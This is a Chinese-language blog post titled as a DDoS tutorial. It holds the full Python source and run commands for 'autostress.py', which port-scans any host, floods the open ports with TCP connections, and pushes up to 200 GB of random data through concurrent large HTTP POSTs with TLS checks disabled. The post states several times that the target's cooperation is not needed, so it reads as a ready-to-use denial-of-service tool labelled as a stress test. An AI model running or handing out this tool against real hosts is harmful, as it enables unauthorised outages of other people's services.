+++
date = '2026-03-30T20:05:55+08:00'
draft = false
title = 'ddos教程'

+++

**全自动跑（推荐）：**



```bash
# 扫描 → TCP压测 → 自动找HTTP端口上传200GB
python3 autostress.py 192.168.1.100 --http-size 200
```

**只做 HTTP 大包上传：**



```bash
# 直接指定端口，跳过扫描
python3 autostress.py 192.168.1.100 --http-only --http-port 80 --http-size 200
```

**调大并发和包体：**



```bash
python3 autostress.py 192.168.1.100 --http-only --http-port 80 \
  --http-size 200 --http-concurrency 20 --chunk-mb 64
```

------

**三个阶段说明：**

| 阶段           | 内容                   | 需要对方配合？                 |
| -------------- | ---------------------- | ------------------------------ |
| ① 端口扫描     | 发现开放端口           | ❌ 不需要                       |
| ② TCP压测      | QPS / 延迟 / 成功率    | ❌ 不需要                       |
| ③ HTTP大包上传 | 吞吐量 / 断连 / 稳定性 | ❌ 不需要（对方有HTTP服务即可） |

> HTTP 大包上传的原理：向目标的 HTTP 服务 POST 大块数据，服务器返回 4xx/5xx 也没关系——数据已经从你这边发出去了，吞吐量照常统计。



```bash
nano /root/autostress.py
```



```python
#!/usr/bin/env python3
"""
自动扫描 + 压测工具 v2.0
1. 扫描目标 IP 的开放端口
2. TCP 连接压测（测 QPS / 延迟 / 稳定性）
3. HTTP 大包上传压测（测吞吐量，无需目标配合接收端）
"""
 
import socket
import time
import threading
import argparse
import sys
import os
import statistics
import ssl
import urllib.request
import urllib.error
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Tuple, Optional
 
# ──────────────────────────────────────────────
# 颜色
# ──────────────────────────────────────────────
R      = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GRAY   = "\033[90m"
BLUE   = "\033[94m"
 
def c(text, *codes): return "".join(codes) + str(text) + R
 
# ──────────────────────────────────────────────
# 常量
# ──────────────────────────────────────────────
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
    5432: "PostgreSQL", 5672: "RabbitMQ", 6379: "Redis",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9200: "Elasticsearch",
    27017: "MongoDB", 11211: "Memcached",
}
HTTP_PORTS = {80, 443, 8080, 8443, 8000, 8008, 8081, 8088, 8888, 9000, 9090}
GB = 1024 ** 3
 
# ──────────────────────────────────────────────
# 工具函数
# ──────────────────────────────────────────────
def make_payload(size: int) -> bytes:
    """动态生成随机数据块，不占磁盘"""
    base = os.urandom(min(size, 65536))
    repeat = size // len(base)
    remainder = size % len(base)
    return base * repeat + base[:remainder]
 
def fmt_size(b: float) -> str:
    if b >= GB:        return f"{b/GB:.2f} GB"
    if b >= 1024**2:   return f"{b/1024**2:.2f} MB"
    if b >= 1024:      return f"{b/1024:.2f} KB"
    return f"{b:.0f} B"
 
def fmt_speed(bps: float) -> str:
    mbps = bps / 1024 / 1024
    if mbps >= 1000: return f"{mbps/1024:.2f} GB/s"
    return f"{mbps:.2f} MB/s"
 
# ──────────────────────────────────────────────
# 阶段 1：端口扫描
# ──────────────────────────────────────────────
def scan_port(host: str, port: int, timeout: float) -> Tuple[int, bool, float]:
    start = time.perf_counter()
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return port, True, (time.perf_counter() - start) * 1000
    except Exception:
        return port, False, 0.0
 
 
def scan_ports(host: str, ports: List[int], timeout: float = 1.0, workers: int = 800) -> List[Tuple[int, float]]:
    open_ports = []
    total = len(ports)
    done  = 0
    lock  = threading.Lock()
 
    print(c(f"\n  🔍 正在扫描 {host} 的 {total} 个端口...", CYAN))
 
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(scan_port, host, p, timeout): p for p in ports}
        for future in as_completed(futures):
            port, is_open, lat = future.result()
            with lock:
                done += 1
                if is_open:
                    open_ports.append((port, lat))
                bar_len = 40
                filled  = int(bar_len * done / total)
                bar = c("█" * filled, GREEN) + c("░" * (bar_len - filled), GRAY)
                print(f"\r  [{bar}] {done}/{total}", end="", flush=True)
 
    print()
    return sorted(open_ports)
 
 
def print_scan_result(host: str, open_ports: List[Tuple[int, float]]):
    sep = c("─" * 60, GRAY)
    print()
    print(sep)
    print(c(f"  🗺  端口扫描结果  →  {host}", BOLD, CYAN))
    print(sep)
    if not open_ports:
        print(c("  未发现任何开放端口", RED))
    else:
        print(f"  {'端口':<8} {'服务':<16} {'连接延迟':<12} {'类型'}")
        print(c("  " + "·" * 46, GRAY))
        for port, lat in open_ports:
            svc       = COMMON_PORTS.get(port, "Unknown")
            lat_color = GREEN if lat < 10 else YELLOW if lat < 50 else RED
            ptype     = c("HTTP ✓", CYAN) if port in HTTP_PORTS else c("TCP", GRAY)
            print(f"  {c(str(port), CYAN):<18} {svc:<16} {c(f'{lat:.1f}ms', lat_color):<20} {ptype}")
    print(sep)
 
 
# ──────────────────────────────────────────────
# 阶段 2：TCP 连接压测
# ──────────────────────────────────────────────
@dataclass
class BenchResult:
    port: int
    service: str
    total: int
    success: int = 0
    latencies: List[float] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    duration: float = 0.0
 
    @property
    def fail(self):         return self.total - self.success
    @property
    def success_rate(self): return self.success / self.total * 100 if self.total else 0
    @property
    def avg_lat(self):      return statistics.mean(self.latencies) if self.latencies else 0
    @property
    def min_lat(self):      return min(self.latencies) if self.latencies else 0
    @property
    def max_lat(self):      return max(self.latencies) if self.latencies else 0
    @property
    def p95_lat(self):
        if not self.latencies: return 0
        s = sorted(self.latencies)
        return s[int(len(s) * 0.95)]
    @property
    def qps(self):          return self.success / self.duration if self.duration else 0
 
 
def _tcp_task(host, port, timeout):
    start = time.perf_counter()
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True, (time.perf_counter() - start) * 1000, None
    except Exception as e:
        return False, (time.perf_counter() - start) * 1000, type(e).__name__
 
 
def bench_port(host, port, requests, concurrency, timeout) -> BenchResult:
    service = COMMON_PORTS.get(port, "Unknown")
    result  = BenchResult(port=port, service=service, total=requests)
    lock    = threading.Lock()
    done    = [0]
 
    print(c(f"\n  ⚡ TCP压测  端口 {port} ({service})  {requests}次 / {concurrency}并发", BOLD))
 
    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(_tcp_task, host, port, timeout) for _ in range(requests)]
        for future in as_completed(futures):
            ok, lat, err = future.result()
            with lock:
                done[0] += 1
                if ok:
                    result.success += 1
                    result.latencies.append(lat)
                elif err:
                    result.errors.append(err)
                bar_len = 35
                filled  = int(bar_len * done[0] / requests)
                bar = c("█" * filled, CYAN) + c("░" * (bar_len - filled), GRAY)
                pct = done[0] / requests * 100
                print(f"\r    [{bar}] {pct:5.1f}%  ✓{result.success} ✗{result.fail}", end="", flush=True)
 
    result.duration = time.perf_counter() - t0
    print()
    return result
 
 
def print_tcp_bench_report(results: List[BenchResult], host: str):
    sep = c("─" * 60, GRAY)
    print()
    print(sep)
    print(c(f"  📊 TCP 压测报告  →  {host}", BOLD, CYAN))
    print(sep)
 
    for r in results:
        sr_color = GREEN if r.success_rate >= 95 else YELLOW if r.success_rate >= 70 else RED
        print()
        print(c(f"  端口 {r.port}  ({r.service})", BOLD))
        print(f"  {'成功率':<14} {c(f'{r.success_rate:.1f}%', sr_color)}  ({r.success}/{r.total})")
        print(f"  {'QPS':<14} {c(f'{r.qps:.1f}', YELLOW)}")
        print(f"  {'总耗时':<14} {r.duration:.2f}s")
        if r.latencies:
            print(f"  {'延迟(ms)':<14} min={r.min_lat:.1f}  avg={c(f'{r.avg_lat:.1f}', CYAN)}  p95={r.p95_lat:.1f}  max={r.max_lat:.1f}")
        if r.errors:
            top  = Counter(r.errors).most_common(3)
            errs = "  ".join(f"{n}x {e}" for e, n in top)
            print(c(f"  错误: {errs}", RED))
        grade = (c("✅ 优秀", GREEN) if r.success_rate >= 99 else
                 c("🟡 良好", YELLOW) if r.success_rate >= 90 else
                 c("⚠️  较差", YELLOW) if r.success_rate >= 50 else
                 c("❌ 不可用", RED))
        print(f"  {'评级':<14} {grade}")
 
    print()
    print(sep)
 
 
# ──────────────────────────────────────────────
# 阶段 3：HTTP 大包上传压测
# ──────────────────────────────────────────────
@dataclass
class HttpBulkResult:
    port: int
    url: str
    target_bytes: int
    sent_bytes: int = 0
    success_reqs: int = 0
    fail_reqs: int = 0
    total_reqs: int = 0
    latencies: List[float] = field(default_factory=list)
    throughputs: List[float] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    duration: float = 0.0
    disconnects: int = 0
 
    @property
    def avg_throughput(self): return statistics.mean(self.throughputs) if self.throughputs else 0
    @property
    def peak_throughput(self): return max(self.throughputs) if self.throughputs else 0
    @property
    def success_rate(self): return self.success_reqs / self.total_reqs * 100 if self.total_reqs else 0
    @property
    def overall_mbps(self): return (self.sent_bytes / self.duration / 1024 / 1024) if self.duration else 0
 
 
def _http_upload_task(url: str, payload: bytes, timeout: int, ssl_ctx) -> Tuple[bool, float, float, str]:
    """
    单次 HTTP POST 上传。
    服务器返回 4xx/5xx 也算"数据已发出"，统计吞吐。
    """
    start = time.perf_counter()
    try:
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/octet-stream")
        req.add_header("User-Agent", "BulkStressTest/2.0")
        req.add_header("Content-Length", str(len(payload)))
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx) as resp:
                resp.read(1024)
        except urllib.error.HTTPError:
            pass  # 4xx/5xx：数据已发出，继续统计
 
        elapsed = time.perf_counter() - start
        mbps = len(payload) / elapsed / 1024 / 1024
        return True, elapsed * 1000, mbps, ""
    except Exception as e:
        elapsed_ms = (time.perf_counter() - start) * 1000
        return False, elapsed_ms, 0.0, str(e)[:100]
 
 
def http_bulk_stress(host, port, total_gb, chunk_mb, concurrency, timeout) -> HttpBulkResult:
    scheme = "https" if port in (443, 8443) else "http"
    url    = f"{scheme}://{host}:{port}/"
 
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode    = ssl.CERT_NONE
 
    target_bytes = int(total_gb * GB)
    chunk_bytes  = chunk_mb * 1024 * 1024
    total_reqs   = max(1, int(target_bytes / chunk_bytes))
 
    result = HttpBulkResult(port=port, url=url, target_bytes=target_bytes, total_reqs=total_reqs)
    lock   = threading.Lock()
    done   = [0]
 
    print(c(f"\n  📤 HTTP 大包上传压测", BOLD))
    print(c(f"     URL:    {url}", GRAY))
    print(c(f"     目标:   {fmt_size(target_bytes)}  ({total_reqs} 个请求 × {chunk_mb}MB)", GRAY))
    print(c(f"     并发:   {concurrency}  超时: {timeout}s", GRAY))
    print()
 
    # 预生成 payload（所有线程共享同一块，不重复分配）
    print(c("  ⏳ 生成数据包...", GRAY), end=" ", flush=True)
    payload = make_payload(chunk_bytes)
    print(c(f"完成 ({fmt_size(len(payload))})", GREEN))
    print()
 
    def reporter():
        while done[0] < total_reqs and result.duration == 0:
            time.sleep(1.5)
            with lock:
                sent = result.sent_bytes
                cur  = done[0]
                fail = result.fail_reqs
            elapsed = time.perf_counter() - t0
            if elapsed <= 0 or sent <= 0:
                continue
            spd     = sent / elapsed / 1024 / 1024
            pct     = sent / target_bytes * 100
            eta_s   = int((target_bytes - sent) / (sent / elapsed))
            eta_str = f"{eta_s//3600}h{(eta_s%3600)//60}m" if eta_s > 3600 else \
                      f"{eta_s//60}m{eta_s%60:02d}s" if eta_s > 60 else f"{eta_s}s"
            bar_len = 32
            filled  = int(bar_len * min(pct, 100) / 100)
            bar = c("█" * filled, GREEN) + c("░" * (bar_len - filled), GRAY)
            print(
                f"\r  [{bar}] {pct:5.1f}%  "
                f"{c(fmt_size(sent), CYAN)}/{fmt_size(target_bytes)}  "
                f"速度:{c(f'{spd:.1f}MB/s', YELLOW)}  "
                f"ETA:{eta_str}  "
                f"失败:{c(str(fail), RED if fail else GRAY)}",
                end="", flush=True
            )
 
    t0 = time.perf_counter()
    rep = threading.Thread(target=reporter, daemon=True)
    rep.start()
 
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(_http_upload_task, url, payload, timeout, ssl_ctx) for _ in range(total_reqs)]
        for future in as_completed(futures):
            ok, lat_ms, mbps, err = future.result()
            with lock:
                done[0] += 1
                if ok:
                    result.success_reqs += 1
                    result.sent_bytes   += chunk_bytes
                    result.latencies.append(lat_ms)
                    result.throughputs.append(mbps)
                else:
                    result.fail_reqs += 1
                    result.errors.append(err)
                    err_l = err.lower()
                    if any(k in err_l for k in ("reset", "broken", "connect", "refused", "timed")):
                        result.disconnects += 1
 
    result.duration = time.perf_counter() - t0
    print()
    return result
 
 
def print_http_bulk_report(r: HttpBulkResult):
    sep = c("─" * 60, GRAY)
    print()
    print(sep)
    print(c(f"  📦 HTTP 大包上传报告  →  {r.url}", BOLD, CYAN))
    print(sep)
    print()
 
    sent_pct = r.sent_bytes / r.target_bytes * 100 if r.target_bytes else 0
    print(f"  {'发送总量':<16} {c(fmt_size(r.sent_bytes), GREEN)}  ({sent_pct:.1f}% of {fmt_size(r.target_bytes)})")
    print(f"  {'总耗时':<16} {r.duration:.2f}s")
    print(f"  {'整体吞吐量':<16} {c(fmt_speed(r.sent_bytes / r.duration) if r.duration else '0', YELLOW)}")
    print(f"  {'请求成功率':<16} {c(f'{r.success_rate:.1f}%', GREEN if r.success_rate >= 95 else YELLOW)}  ({r.success_reqs}/{r.total_reqs})")
    print()
 
    if r.throughputs:
        avg_tp = statistics.mean(r.throughputs)
        peak   = max(r.throughputs)
        med    = statistics.median(r.throughputs)
        low    = min(r.throughputs)
        print(f"  {'单请求吞吐(MB/s)':<16}")
        print(f"    {'平均':<12} {c(f'{avg_tp:.2f}', CYAN)}")
        print(f"    {'中位数':<12} {med:.2f}")
        print(f"    {'峰值':<12} {c(f'{peak:.2f}', GREEN)}")
        print(f"    {'最低':<12} {low:.2f}")
        print()
 
    if r.latencies:
        sl = sorted(r.latencies)
        print(f"  {'请求延迟(ms)':<16}")
        print(f"    {'平均':<12} {statistics.mean(r.latencies):.0f}")
        print(f"    {'P95':<12} {sl[int(len(sl)*0.95)]:.0f}")
        print(f"    {'P99':<12} {sl[int(len(sl)*0.99)]:.0f}")
        print(f"    {'最大':<12} {max(r.latencies):.0f}")
        print()
 
    print(f"  {'断连/重置':<16} {c(str(r.disconnects), RED if r.disconnects else GREEN)}")
 
    if r.errors:
        print()
        print(c("  错误摘要 (TOP 5):", YELLOW))
        for err, cnt in Counter(r.errors).most_common(5):
            print(f"    [{cnt}x] {err}")
 
    print()
    print(c("  稳定性评估:", BOLD))
    if r.success_rate >= 99 and r.disconnects == 0:
        print(c("  ✅ 优秀 — 全程无断连，吞吐稳定", GREEN))
    elif r.success_rate >= 90:
        print(c(f"  🟡 良好 — 成功率 {r.success_rate:.1f}%，轻微波动", YELLOW))
    elif r.success_rate >= 60:
        print(c(f"  ⚠️  较差 — 成功率 {r.success_rate:.1f}%，服务器可能限流或过载", YELLOW))
    else:
        print(c(f"  ❌ 不可用 — 大量请求失败（{r.fail_reqs}/{r.total_reqs}），检查目标服务", RED))
 
    print()
    print(sep)
    print()
 
 
# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────
def parse_args():
    parser = argparse.ArgumentParser(
        description="自动扫描 + TCP压测 + HTTP大包上传压测（无需目标配合）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 全自动：扫描 → TCP压测 → HTTP大包上传（默认1GB）
  python3 autostress.py 192.168.1.100
 
  # 发送 200GB HTTP 大包（自动找HTTP端口）
  python3 autostress.py 192.168.1.100 --http-size 200
 
  # 只做 HTTP 大包上传，指定端口
  python3 autostress.py 192.168.1.100 --http-only --http-port 8080 --http-size 10
 
  # 大并发大包：20并发 × 64MB 单包 × 200GB
  python3 autostress.py 192.168.1.100 --http-only --http-port 80 \\
      --http-size 200 --http-concurrency 20 --chunk-mb 64
 
  # 只扫描端口，不压测
  python3 autostress.py 192.168.1.100 --scan-only
 
  # 全端口扫描
  python3 autostress.py 192.168.1.100 --full-scan
        """
    )
    parser.add_argument("host", help="目标 IP 或域名")
 
    scan = parser.add_argument_group("扫描参数")
    scan.add_argument("--full-scan", action="store_true", help="扫描全部 65535 端口")
    scan.add_argument("--ports", type=str, default=None, help="手动指定端口，如 80,443 或 1-1024")
    scan.add_argument("--scan-only", action="store_true", help="只扫描端口，不压测")
    scan.add_argument("--scan-timeout", type=float, default=0.8, help="扫描超时(默认0.8s)")
    scan.add_argument("--scan-workers", type=int, default=800, help="扫描并发数(默认800)")
 
    tcp = parser.add_argument_group("TCP压测参数")
    tcp.add_argument("-n", "--requests", type=int, default=200, help="每端口TCP请求数(默认200)")
    tcp.add_argument("-c", "--concurrency", type=int, default=20, help="TCP并发数(默认20)")
    tcp.add_argument("--bench-timeout", type=int, default=5, help="TCP连接超时(默认5s)")
    tcp.add_argument("--max-bench-ports", type=int, default=3, help="最多TCP压测端口数(默认3)")
 
    http = parser.add_argument_group("HTTP大包上传参数")
    http.add_argument("--http-only", action="store_true",
                      help="跳过扫描和TCP压测，直接做HTTP大包上传")
    http.add_argument("--http-port", type=int, default=None,
                      help="HTTP上传目标端口（默认自动检测）")
    http.add_argument("--http-size", type=float, default=1.0,
                      help="上传总量 GB（默认1GB，大测试用200）")
    http.add_argument("--chunk-mb", type=int, default=32,
                      help="单次上传包大小 MB（默认32MB）")
    http.add_argument("--http-concurrency", type=int, default=10,
                      help="HTTP上传并发连接数（默认10）")
    http.add_argument("--http-timeout", type=int, default=60,
                      help="HTTP请求超时(默认60s)")
    http.add_argument("--no-http", action="store_true",
                      help="跳过HTTP大包上传测试")
 
    return parser.parse_args()
 
 
def resolve_ports(args) -> List[int]:
    if args.ports:
        ports = []
        for seg in args.ports.split(","):
            seg = seg.strip()
            if "-" in seg:
                a, b = seg.split("-")
                ports.extend(range(int(a), int(b) + 1))
            else:
                ports.append(int(seg))
        return ports
    elif args.full_scan:
        return list(range(1, 65536))
    else:
        return sorted(set(list(COMMON_PORTS.keys()) + [
            8000, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
            8090, 8888, 9000, 9090, 9091, 9092, 9100, 9300, 9999,
            4000, 4001, 4040, 4200, 4443, 4500,
            2181, 2375, 2376, 2379, 2380,
            5000, 5001, 5601, 5900,
            6000, 6001, 6443, 6800,
            7000, 7001, 7002, 7070, 7077, 7474,
            10000, 10001, 10250, 10255,
            15672, 16379, 50070,
        ]))
 
 
def main():
    args = parse_args()
    host = args.host
 
    print()
    print(c("  ╔══════════════════════════════════════════════╗", CYAN))
    print(c("  ║   🛰  自动扫描 + TCP + HTTP大包压测  v2.0    ║", CYAN, BOLD))
    print(c("  ╚══════════════════════════════════════════════╝", CYAN))
    print()
    print(c(f"  目标: {host}", BOLD))
 
    try:
        ip = socket.gethostbyname(host)
        if ip != host:
            print(c(f"  解析: {ip}", GRAY))
    except Exception as e:
        print(c(f"  ❌ DNS 解析失败: {e}", RED))
        sys.exit(1)
 
    # ── HTTP-only 模式 ──
    if args.http_only:
        port = args.http_port or 80
        print(c(f"\n  [HTTP-only 模式]  端口 {port}  上传 {args.http_size}GB", YELLOW))
        r = http_bulk_stress(
            host=host, port=port,
            total_gb=args.http_size,
            chunk_mb=args.chunk_mb,
            concurrency=args.http_concurrency,
            timeout=args.http_timeout,
        )
        print_http_bulk_report(r)
        return
 
    # ── 全自动模式 ──
    ports = resolve_ports(args)
    print(c(f"  扫描端口数: {len(ports)}", GRAY))
 
    # 阶段1：扫描
    open_ports = scan_ports(host, ports, timeout=args.scan_timeout, workers=args.scan_workers)
    print_scan_result(host, open_ports)
 
    if not open_ports:
        print(c("  没有找到开放端口，退出。", RED))
        print(c("  提示：防火墙可能拦截了扫描，试试 --scan-timeout 2", GRAY))
        sys.exit(0)
 
    if args.scan_only:
        sys.exit(0)
 
    # 阶段2：TCP 压测
    bench_targets = [p for p, _ in open_ports[:args.max_bench_ports]]
    skipped = [str(p) for p, _ in open_ports[args.max_bench_ports:]]
    if skipped:
        print(c(f"\n  ℹ️  TCP只压测前 {args.max_bench_ports} 个端口，其余跳过: {', '.join(skipped)}", GRAY))
 
    print(c(f"\n  ── 阶段2：TCP 连接压测 ──", BOLD))
    tcp_results = []
    for port in bench_targets:
        r = bench_port(host, port, args.requests, args.concurrency, args.bench_timeout)
        tcp_results.append(r)
    print_tcp_bench_report(tcp_results, host)
 
    # 阶段3：HTTP 大包上传
    if args.no_http:
        return
 
    http_port = args.http_port
    if not http_port:
        for p, _ in open_ports:
            if p in HTTP_PORTS:
                http_port = p
                break
 
    if not http_port:
        print(c("\n  ℹ️  未发现 HTTP/HTTPS 端口，跳过大包上传测试。", YELLOW))
        print(c("     如需强制测试，使用 --http-port <端口>", GRAY))
        return
 
    print(c(f"\n  ── 阶段3：HTTP 大包上传压测 ──", BOLD))
    r = http_bulk_stress(
        host=host, port=http_port,
        total_gb=args.http_size,
        chunk_mb=args.chunk_mb,
        concurrency=args.http_concurrency,
        timeout=args.http_timeout,
    )
    print_http_bulk_report(r)
 
 
if __name__ == "__main__":
    main()
 
```

